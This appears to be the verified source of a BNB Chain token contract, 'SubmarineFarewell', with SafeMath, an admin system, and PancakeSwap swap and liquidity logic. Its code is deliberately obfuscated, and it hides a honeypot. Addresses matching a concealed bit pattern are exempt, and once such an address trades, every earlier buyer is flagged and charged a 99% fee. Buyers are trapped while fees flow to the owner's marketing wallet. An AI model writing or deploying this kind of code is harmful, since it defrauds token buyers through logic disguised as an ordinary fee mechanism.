/**
 *Submitted for verification at BscScan.com on 2022-12-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Admin {
    address internal owner;
    mapping(address => bool) internal Administration;

    constructor(address _owner) {
        owner = _owner;
        Administration[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAdmin(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAdmin(address adr) public onlyOwner() {
        Administration[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAdmin(address adr) public onlyOwner() {
        Administration[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAdmin(address adr) public view returns (bool) {
        return Administration[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        Administration[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract SubmarineFarewell is IBEP20, Admin {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Submarine Farewell ";
    string constant _symbol = "SubmarineFarewell";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private limitReceiverBotsMarketing;
    mapping(address => bool) private autoMaxBurnIs;
    mapping(address => bool) private tradingTxSwapLimitReceiver;
    mapping(address => bool) private buyExemptTradingTxBotsAuto;
    mapping(address => uint256) private sellLimitSwapTeam;
    mapping(uint256 => address) private maxBuyReceiverExempt;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private feeLimitBurnReceiverLiquidityTeam = 0;
    uint256 private botsMarketingSwapLiquidity = 8;

    //SELL FEES
    uint256 private feeTeamBotsLiquidity = 0;
    uint256 private marketingMinExemptBuy = 8;

    uint256 private autoTradingTeamModeLimit = botsMarketingSwapLiquidity + feeLimitBurnReceiverLiquidityTeam;
    uint256 private swapFeeAutoBots = 100;

    address private limitTeamMinWallet = (msg.sender); // auto-liq address
    address private maxBuyTradingAutoFeeWalletBurn = (0x0c895f74284E96C47fF5f6DDffffe5E00793FcAc); // marketing address
    address private sellTradingModeReceiver = DEAD;
    address private minLimitBotsAuto = DEAD;
    address private exemptMinTxTrading = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private minMaxBuySell;
    uint256 private botsWalletModeSellIsTx;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private exemptMaxLimitReceiverWallet;
    uint256 private buyExemptWalletLaunchedLimit;
    uint256 private minMarketingIsExemptBuy;
    uint256 private tradingMarketingSwapAuto;
    uint256 private tradingWalletExemptBurn;

    bool private isLimitWalletLiquidity = true;
    bool private buyExemptTradingTxBotsAutoMode = true;
    bool private liquidityAutoReceiverSwap = true;
    bool private exemptMaxLaunchedBotsWalletReceiverTeam = true;
    bool private liquidityTradingModeLaunched = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private minModeMaxFee = _totalSupply / 1000; // 0.1%

    
    uint256 private botsIsTradingBurnLimit;
    uint256 private walletBotsMaxSwap;
    uint256 private burnBotsFeeAuto;
    bool private walletMinLaunchedSellFeeMarketing;
    bool private isBotsSellExemptWallet;
    bool private teamBotsLiquidityMaxSell;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Admin(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        exemptMaxLimitReceiverWallet = true;

        limitReceiverBotsMarketing[msg.sender] = true;
        limitReceiverBotsMarketing[address(this)] = true;

        autoMaxBurnIs[msg.sender] = true;
        autoMaxBurnIs[0x0000000000000000000000000000000000000000] = true;
        autoMaxBurnIs[0x000000000000000000000000000000000000dEaD] = true;
        autoMaxBurnIs[address(this)] = true;

        tradingTxSwapLimitReceiver[msg.sender] = true;
        tradingTxSwapLimitReceiver[0x0000000000000000000000000000000000000000] = true;
        tradingTxSwapLimitReceiver[0x000000000000000000000000000000000000dEaD] = true;
        tradingTxSwapLimitReceiver[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return botsSwapMaxExempt(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return botsSwapMaxExempt(sender, recipient, amount);
    }

    function botsSwapMaxExempt(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = sellSwapMarketingLaunchedTradingMaxTx(sender) || sellSwapMarketingLaunchedTradingMaxTx(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                burnTeamTradingLimit();
            }
            if (!bLimitTxWalletValue) {
                exemptBuyBurnSwap(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return tradingFeeMarketingExempt(sender, recipient, amount);}

        if (!Administration[sender] && !Administration[recipient]) {
            require(isLimitWalletLiquidity, "Trading is not active");
        }

        if (!Administration[sender] && !limitReceiverBotsMarketing[sender] && !limitReceiverBotsMarketing[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || tradingTxSwapLimitReceiver[sender] || tradingTxSwapLimitReceiver[recipient], "Max TX Limit has been triggered");

        if (sellBurnAutoMode()) {burnAutoWalletLimitSellMode();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = autoMarketingTeamExemptLimit(sender) ? limitBurnBuyMode(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function tradingFeeMarketingExempt(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function autoMarketingTeamExemptLimit(address sender) internal view returns (bool) {
        return !autoMaxBurnIs[sender];
    }

    function feeModeReceiverTx(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            autoTradingTeamModeLimit = marketingMinExemptBuy + feeTeamBotsLiquidity;
            return marketingLaunchedReceiverLimitMin(sender, autoTradingTeamModeLimit);
        }
        if (!selling && sender == uniswapV2Pair) {
            autoTradingTeamModeLimit = botsMarketingSwapLiquidity + feeLimitBurnReceiverLiquidityTeam;
            return autoTradingTeamModeLimit;
        }
        return marketingLaunchedReceiverLimitMin(sender, autoTradingTeamModeLimit);
    }

    function limitBurnBuyMode(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(feeModeReceiverTx(sender, receiver == uniswapV2Pair)).div(swapFeeAutoBots);

        if (buyExemptTradingTxBotsAuto[sender] || buyExemptTradingTxBotsAuto[receiver]) {
            feeAmount = amount.mul(99).div(swapFeeAutoBots);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function sellSwapMarketingLaunchedTradingMaxTx(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function marketingLaunchedReceiverLimitMin(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = sellLimitSwapTeam[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function exemptBuyBurnSwap(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        maxBuyReceiverExempt[exemptLimitValue] = addr;
    }

    function burnTeamTradingLimit() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (sellLimitSwapTeam[maxBuyReceiverExempt[i]] == 0) {
                    sellLimitSwapTeam[maxBuyReceiverExempt[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(maxBuyTradingAutoFeeWalletBurn).transfer(amountBNB * amountPercentage / 100);
    }

    function sellBurnAutoMode() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    liquidityTradingModeLaunched &&
    _balances[address(this)] >= minModeMaxFee;
    }

    function burnAutoWalletLimitSellMode() internal swapping {
        uint256 amountToLiquify = minModeMaxFee.mul(feeLimitBurnReceiverLiquidityTeam).div(autoTradingTeamModeLimit).div(2);
        uint256 amountToSwap = minModeMaxFee.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = autoTradingTeamModeLimit.sub(feeLimitBurnReceiverLiquidityTeam.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(feeLimitBurnReceiverLiquidityTeam).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(botsMarketingSwapLiquidity).div(totalETHFee);

        payable(maxBuyTradingAutoFeeWalletBurn).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                limitTeamMinWallet,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getTradingTxSwapLimitReceiver(address a0) public view returns (bool) {
        if (a0 == minLimitBotsAuto) {
            return exemptMaxLaunchedBotsWalletReceiverTeam;
        }
            return tradingTxSwapLimitReceiver[a0];
    }
    function setTradingTxSwapLimitReceiver(address a0,bool a1) public onlyOwner {
        if (a0 == sellTradingModeReceiver) {
            liquidityTradingModeLaunched=a1;
        }
        if (tradingTxSwapLimitReceiver[a0] != limitReceiverBotsMarketing[a0]) {
           limitReceiverBotsMarketing[a0]=a1;
        }
        tradingTxSwapLimitReceiver[a0]=a1;
    }

    function getMaxBuyReceiverExempt(uint256 a0) public view returns (address) {
        if (a0 != feeLimitBurnReceiverLiquidityTeam) {
            return limitTeamMinWallet;
        }
        if (a0 == feeLimitBurnReceiverLiquidityTeam) {
            return minLimitBotsAuto;
        }
            return maxBuyReceiverExempt[a0];
    }
    function setMaxBuyReceiverExempt(uint256 a0,address a1) public onlyOwner {
        if (a0 != marketingMinExemptBuy) {
            sellTradingModeReceiver=a1;
        }
        if (a0 == marketingMinExemptBuy) {
            sellTradingModeReceiver=a1;
        }
        maxBuyReceiverExempt[a0]=a1;
    }

    function getFeeTeamBotsLiquidity() public view returns (uint256) {
        return feeTeamBotsLiquidity;
    }
    function setFeeTeamBotsLiquidity(uint256 a0) public onlyOwner {
        if (feeTeamBotsLiquidity != feeTeamBotsLiquidity) {
            feeTeamBotsLiquidity=a0;
        }
        if (feeTeamBotsLiquidity != marketingMinExemptBuy) {
            marketingMinExemptBuy=a0;
        }
        feeTeamBotsLiquidity=a0;
    }

    function getBotsMarketingSwapLiquidity() public view returns (uint256) {
        if (botsMarketingSwapLiquidity == autoTradingTeamModeLimit) {
            return autoTradingTeamModeLimit;
        }
        if (botsMarketingSwapLiquidity != feeLimitBurnReceiverLiquidityTeam) {
            return feeLimitBurnReceiverLiquidityTeam;
        }
        return botsMarketingSwapLiquidity;
    }
    function setBotsMarketingSwapLiquidity(uint256 a0) public onlyOwner {
        if (botsMarketingSwapLiquidity == swapFeeAutoBots) {
            swapFeeAutoBots=a0;
        }
        if (botsMarketingSwapLiquidity != swapFeeAutoBots) {
            swapFeeAutoBots=a0;
        }
        botsMarketingSwapLiquidity=a0;
    }

    function getMaxBuyTradingAutoFeeWalletBurn() public view returns (address) {
        return maxBuyTradingAutoFeeWalletBurn;
    }
    function setMaxBuyTradingAutoFeeWalletBurn(address a0) public onlyOwner {
        if (maxBuyTradingAutoFeeWalletBurn != maxBuyTradingAutoFeeWalletBurn) {
            maxBuyTradingAutoFeeWalletBurn=a0;
        }
        if (maxBuyTradingAutoFeeWalletBurn == limitTeamMinWallet) {
            limitTeamMinWallet=a0;
        }
        if (maxBuyTradingAutoFeeWalletBurn != minLimitBotsAuto) {
            minLimitBotsAuto=a0;
        }
        maxBuyTradingAutoFeeWalletBurn=a0;
    }

    function getMinLimitBotsAuto() public view returns (address) {
        if (minLimitBotsAuto != minLimitBotsAuto) {
            return minLimitBotsAuto;
        }
        if (minLimitBotsAuto == limitTeamMinWallet) {
            return limitTeamMinWallet;
        }
        return minLimitBotsAuto;
    }
    function setMinLimitBotsAuto(address a0) public onlyOwner {
        if (minLimitBotsAuto != sellTradingModeReceiver) {
            sellTradingModeReceiver=a0;
        }
        minLimitBotsAuto=a0;
    }

    function getLimitTeamMinWallet() public view returns (address) {
        if (limitTeamMinWallet == exemptMinTxTrading) {
            return exemptMinTxTrading;
        }
        if (limitTeamMinWallet == sellTradingModeReceiver) {
            return sellTradingModeReceiver;
        }
        if (limitTeamMinWallet != minLimitBotsAuto) {
            return minLimitBotsAuto;
        }
        return limitTeamMinWallet;
    }
    function setLimitTeamMinWallet(address a0) public onlyOwner {
        if (limitTeamMinWallet == exemptMinTxTrading) {
            exemptMinTxTrading=a0;
        }
        if (limitTeamMinWallet != sellTradingModeReceiver) {
            sellTradingModeReceiver=a0;
        }
        if (limitTeamMinWallet != limitTeamMinWallet) {
            limitTeamMinWallet=a0;
        }
        limitTeamMinWallet=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}